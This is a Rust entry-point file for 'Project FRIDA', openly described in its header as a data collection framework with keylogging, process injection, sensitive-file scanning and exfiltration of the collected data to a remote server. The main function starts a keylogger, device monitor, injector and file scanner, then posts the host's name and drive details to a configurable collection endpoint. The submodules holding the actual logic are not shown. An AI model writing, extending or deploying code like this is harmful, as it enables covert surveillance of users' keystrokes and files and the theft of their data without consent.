//! Project FRIDA - System Monitoring and Data Collection Framework
//!
//! This application provides comprehensive system monitoring capabilities,
//! including keylogging, device monitoring, drive enumeration, process monitoring,
//! and sensitive file scanning. Data is collected locally and can be exfiltrated
//! to a remote server with full metadata and analysis.

/// Storage device enumeration and information gathering
pub mod drives;
/// USB and peripheral device monitoring
pub mod device_monitor;
/// Keyboard input monitoring and logging
pub mod keylogger;
/// Network communication for data exfiltration
pub mod network;
/// File system operations for data persistence
pub mod writer;
/// Logging utilities for application events
pub mod log;
/// Process monitoring and Python script execution module
pub mod injector;
/// File scanning and content analysis module
pub mod file_scanner;

use serde::Serialize;
use std::env;
use crate::log::Log;



#[derive(Serialize)]
struct Payload<'a> {
    hostname: String,
    drives: &'a [drives::DriveInfo],
}

#[tokio::main]
async fn main() {
    Log::info(format!("Project Frida (Rust Edition) - Initializing..."));
    // 1. Start the keylogger in a background thread.
    keylogger::start_keylogger();
    // 1.1. Start the device monitor in a background thread.
    device_monitor::start_device_monitor();
    // 1.2. Start Injector Service
    injector::start_injector_service();
    // 1.3. Start File Scanner Service
    file_scanner::start_file_scanner();
    // 2. Collect drive info.
    let drives = drives::list_drives();
    Log::info(format!("Found {} drives:", drives.len()));
    for drive in &drives {
        Log::info(format!("  - {:?}", drive));
    }
    // 3. Persist locally.
    let _ = writer::save_output(&drives, "logs/drive_info.json", false)
    .map_err(|e| Log::error(format!("Failed to save drive info: {}", e))); 
    // 4. Exfiltrate data to server.
    let server_url = env::var("COLLECT_ENDPOINT").unwrap_or_else(|_| "http://localhost:8080/collect".to_string());
    let hostname = sysinfo::System::host_name().unwrap_or_else(|| "unknown_host".to_string());
    let payload = Payload {
        hostname,
        drives: &drives,
    };
    Log::info(format!("Sending data to {}...", server_url));
    match network::send_to_server(&payload, &server_url).await {
        Ok(_) => Log::info(format!("Data sent successfully.")),
        Err(e) => Log::error(format!("Failed to send data: {}", e)),
    };
    // Keep the main thread alive to allow the keylogger to run.
    // In a real scenario, this might be a more complex loop or service.
    Log::info(format!("Application is running. Press Ctrl+C to exit."));
    loop {
        std::thread::sleep(std::time::Duration::from_secs(60));
    }
}
